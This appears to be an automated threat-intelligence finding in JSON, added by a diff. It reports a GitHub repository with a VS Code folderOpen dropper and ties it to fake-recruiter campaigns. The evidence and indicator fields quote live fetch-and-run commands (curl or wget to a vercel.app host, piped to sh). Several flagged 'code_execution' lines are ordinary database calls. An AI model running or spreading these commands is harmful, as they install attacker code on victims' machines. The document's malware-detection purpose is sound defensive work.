@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:goldendragon68/bullana",
+    "kind": "repository",
+    "family": "",
+    "id": "goldendragon68/bullana",
+    "url": "https://github.com/goldendragon68/Bullana",
+    "registry": "github",
+    "owner": "goldendragon68",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 16,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob; code_execution/js-exec",
+    "evidence_locations": ".vscode/tasks.json:0; frontend/src/services/authService.ts:106; backend/helpers/common.js:103; backend/helpers/common.js:106; backend/helpers/common.js:116; backend/helpers/common.js:119; backend/helpers/common.js:145; backend/helpers/common.js:175; backend/helpers/common.js:238; backend/helpers/common.js:255; backend/helpers/common.js:269; backend/helpers/common.js:288; backend/helpers/common.js:325; backend/helpers/common.js:333; backend/helpers/common.js:348; backend/helpers/common.js:357; backend/helpers/common.js:363; backend/helpers/common.js:371; backend/helpers/common.js:386; backend/helpers/common.js:427",
+    "c2_hosts": "jerryfox-platform.vercel.app",
+    "iocs": "jerryfox-platform.vercel.app; https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9; https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9; curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh; .vscode/tasks.json",
+    "matched_signatures": "task/mac?token=; task/linux?token=; task/windows?token=",
+    "reasons": "Shares a confirmed-malware code signature ['task/mac?token=', 'task/linux?token=', 'task/windows?token='] | Tier-2 confirmed (bash score 16)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260807T205513Z",
+    "last_seen": "hunt-20260807T205513Z",
+    "evidence_file": "repositories/goldendragon68_bullana.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh wget -qO- 'https://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9' | sh curl https://jerryfox-platform.vercel.a"
+    },
+    {
+      "file": "frontend/src/services/authService.ts",
+      "line": 106,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const payload = JSON.parse(atob(token.split('.')[1]));"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 103,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var balance = await wallet.updateOne({ user_id: mongoose.mongo.ObjectId(userId), \"wallet.currency\": curr }, { \"$set\": { \"wallet.$.amount\": +parseFloat(amount).toFixed(6) } }, { multi: true }).exec();"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 106,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "/*wallet.updateOne({user_id:mongoose.mongo.ObjectId(userId), \"wallet.currency\":curr},{\"$set\":{\"wallet.$.amount\": +parseFloat(amount).toFixed(6)}}, {multi:true}).exec(function(balErr,balRes){"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 116,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var username = await users.findOne({ _id: mongoose.mongo.ObjectId(userId) }).exec();"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 119,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "/*users.findOne({_id:mongoose.mongo.ObjectId(userId)}).exec(function(err,res){"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 145,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "wallet.findOne({ user_id: mongoose.mongo.ObjectId(userId) }, { wallet: { $elemMatch: { currency: curr } } }).exec(function (err, resData) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 175,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "wallet.findOne({ user_id: mongoose.mongo.ObjectId(userId) }, { wallet: 1, _id: 0 }).exec(function (err, resData) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 238,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "users.updateOne({ '_id': mongoose.mongo.ObjectId(id) }, { 'gamecount': counts }).exec(function (err, resp) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 255,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "users.updateOne({ '_id': mongoose.mongo.ObjectId(id) }, { 'wagered': counts }).exec(function (err, resp) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 269,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "currencyData.findOne({ currency: currency }, { market_price: 1, _id: 0 }).exec(function (erCurr, resCurr) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 288,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "vipLvl.find({'XP': {$lte:condata}}).sort({'XP': -1 }).exec(async function(viperr, vipRes){"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 325,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var updatesCnt = await users.updateOne({ \"_id\": userId, \"gamecount.name\": game }, { $inc: { \"gamecount.$.BNB\": Number((bnb * 1).toFixed(4)), \"gamecount.$.BUSD\": Number((busd * 1).toFixed(4)), \"gamecou"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 333,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "users.updateOne({ \"_id\": mongoose.mongo.ObjectId(userId) }, { $push: { wagered: { currencyName: currency, wageres: Number(betamt * 1), profit: Number(marketPrc.toFixed(4)) } } }).exec(function (wageEr"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 348,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var updatesFnc = await users.updateOne({ \"_id\": userId, \"gamecount.name\": game }, { $inc: { \"gamecount.$.JB\": Number(amount.toFixed(4)), \"gamecount.$.JB_betamt\": Number(jbBet) } }).exec();"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 357,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "users.updateOne({ _id: userId }, { $set: { gamecount: storeData } }).exec(function (upderr, updres) {"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 363,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var updatesCnt = await users.updateOne({ \"_id\": userId, \"gamecount.name\": game }, { $inc: { \"gamecount.$.BNB\": Number((bnb * 1).toFixed(4)), \"gamecount.$.BUSD\": Number((busd * 1).toFixed(4)), \"gamecou"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 371,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "users.updateOne({ \"_id\": mongoose.mongo.ObjectId(userId) }, { $push: { wagered: { currencyName: currency, wageres: Number(betamt * 1), profit: Number(marketPrc.toFixed(4)) } } }).exec(function (wageEr"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 386,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "var updatesFnc = await users.updateOne({ \"_id\": userId, \"gamecount.name\": game }, { $inc: { \"gamecount.$.JB\": Number(amount.toFixed(4)), \"gamecount.$.JB_betamt\": Number((jbBet * 1).toFixed(4)) } }).ex"
+    },
+    {
+      "file": "backend/helpers/common.js",
+      "line": 427,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "betHistory.updateMany({ user_id: userId, server_seed: serverSeed, game: game }, { $set: { seed_status: 1 } }).exec(function (err, resp) {"
+    }
+  ],
+  "commit_sha": "626c77fdf19f692250b0a48295012b13d29741ed",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/goldendragon68/bullana",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from jerryfox-platform.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: jerryfox-platform.vercel.app.\nCampaign GW-C-a3717cc8: one of 20 confirmed repos across 17 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 10 distinct hosts, including codeviewer-three.vercel.app, coreviewer.vercel.app, jerryfox-platform.vercel.app, task-hrec.vercel.app, thopywork.vercel.app.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nFound by GitHub code search for a confirmed malware signature: task/mac?token=; task/linux?token=; task/windows?token=.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from jerryfox-platform.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: jerryfox-platform.vercel.app",
+    "publisher": "goldendragon68",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/.vscode/tasks.json\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/frontend/src/services/authService.ts#L106\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L103\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L106\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L116\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L119\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L145\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L175\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L238\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L255\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L269\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L288\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L325\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L333\nhttps://github.com/goldendragon68/bullana/blob/626c77fdf19f692250b0a48295012b13d29741ed/backend/helpers/common.js#L348",
+    "verified_iocs": "jerryfox-platform.vercel.app\nhttps://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9\nhttps://jerryfox-platform.vercel.app/task/linux?token=bc7be3873ca9\ncurl 'https://jerryfox-platform.vercel.app/task/mac?token=bc7be3873ca9' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-08-07T20:55:13Z",
+    "last_seen": "2026-08-07T20:55:13Z"
+  }
+}
